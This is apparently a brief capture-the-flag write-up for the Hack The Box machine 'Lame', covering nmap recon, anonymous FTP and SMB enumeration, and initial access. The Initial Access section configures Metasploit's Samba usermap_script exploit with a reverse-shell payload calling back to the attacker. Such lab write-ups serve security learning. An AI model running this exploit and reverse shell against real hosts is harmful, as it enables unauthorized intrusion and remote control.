# Lame



<figure><img src="../../../../.gitbook/assets/image (350).png" alt=""><figcaption></figcaption></figure>

### Recon

How many of the nmap top 1000 TCP ports are open on the remote host?

<figure><img src="../../../../.gitbook/assets/image (106).png" alt=""><figcaption><p>4 Ports Open</p></figcaption></figure>

i will see the port open FTP - 21 with \
login Anonymous \
and \
Password Anonymous

```bash
ftp 10.10.10.3
```

<figure><img src="../../../../.gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>

but can't expliot ftp  come i will try expliot using smb

{% hint style="success" %}
With Passweord Protected OFF
{% endhint %}

```
smbclient -L 10.10.10.3
```

<figure><img src="../../../../.gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>

### Initial Access

```bash
exploit/multi/samba/usermap_script
set payload cmd/unix/reverse
set lhost tun0
set lport 443
```

<figure><img src="../../../../.gitbook/assets/image (113).png" alt=""><figcaption></figcaption></figure>

Root Flag

<figure><img src="../../../../.gitbook/assets/image (114).png" alt=""><figcaption></figcaption></figure>

User Flag

<figure><img src="../../../../.gitbook/assets/image (115).png" alt=""><figcaption></figcaption></figure>

### Exploits Used

**msfconsole**

```
exploit/multi/samba/usermap_script
```

### Tools Used

* Nmap
* smbclient
* nc

